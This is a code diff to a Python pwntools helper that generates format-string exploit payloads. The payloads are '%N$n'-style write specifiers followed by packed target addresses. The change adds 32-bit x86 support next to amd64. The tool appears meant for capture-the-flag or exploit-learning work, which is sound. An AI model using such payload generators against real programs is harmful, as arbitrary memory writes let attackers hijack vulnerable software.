@@ -1,11 +1,10 @@
 #!/bin/env python3
 import subprocess
-from pwn import p64
+from pwn import p64, p32
 import sys
 
+
 # Added code to help hexencode strings and bytes
-
-
 def hexify(inp_bytes):
     inp_bytes = inp_bytes[::-1]
     out = ""
@@ -106,7 +105,8 @@ def cprinter(what):
     return what
 
 
-def writer(c2print, steps, param_offset):
+# The mistic function that house the magic of binary relm
+def writer(c2print, steps, param_offset, ptr_size):
     pld = ""
     if steps == 4:
         bytes2write = ""
@@ -132,7 +132,7 @@ def writer(c2print, steps, param_offset):
         fmt = []
         for x in c2print:
             fmt.append("%" + str(next_param + expected_length //
-                                 8) + "$" + bytes2write + "n")
+                                 ptr_size) + "$" + bytes2write + "n")
             next_param += 1
 
         pld = ""
@@ -176,10 +176,16 @@ def prep_bytes(what, steps):
     return final, order
 
 
-def write(content,  param_offset, context="compact"):
+def write(content,  param_offset, context="compact", platform="amd64"):
     what = list(content.values())
     where = list(content.keys())
     addr = sanitize_where(where)
+    if platform == "amd64":
+        ptr_size = 8
+        pack = p64
+    elif platform == "x86":
+        pack = p32
+        ptr_size = 4
 
     for x in range(len(what)):
         try:
@@ -198,7 +204,8 @@ def write(content,  param_offset, context="compact"):
 
     final = cprinter(final)
 
-    fmt = writer(final, steps, param_offset)
+    fmt = writer(final, steps, param_offset, ptr_size)
+    # print("=> " + fmt)
     fmt = fmt.encode()
 
     # print("order: " + str(order))
@@ -221,7 +228,7 @@ def write(content,  param_offset, context="compact"):
         # print("addr[addr_index]: " + hex(addr[marker] + steps * (max_splits-x[0])))
         # print("-------\n")
 
-        fmt += p64(addr[marker] + steps * (max_splits - x[0]))
+        fmt += pack(addr[marker] + steps * (max_splits - x[0]))
 
     return fmt
 
